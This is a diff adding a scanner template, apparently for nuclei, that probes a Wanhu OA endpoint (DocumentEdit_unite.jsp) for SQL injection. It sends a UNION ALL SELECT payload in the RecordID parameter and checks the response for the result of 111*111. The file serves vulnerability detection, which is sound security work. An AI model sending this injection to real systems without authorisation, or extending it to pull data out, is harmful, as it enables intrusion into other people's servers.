@@ -1,0 +1,26 @@
+id: wanhu-DocumentEdit_unite-sql
+
+info:
+  name: wanhu-DocumentEdit_unite-sql
+  author: wanhu-DocumentEdit_unite-sql
+
+requests:
+  - raw:
+      - |
+        GET /defaultroot/public/iWebOfficeSign/DocumentEdit_unite.jsp;?RecordID=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(select%20111*111),NULL,NULL,NULL,NULL,NULL,NULL-- HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Connection: close
+
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body,'12321')"
+
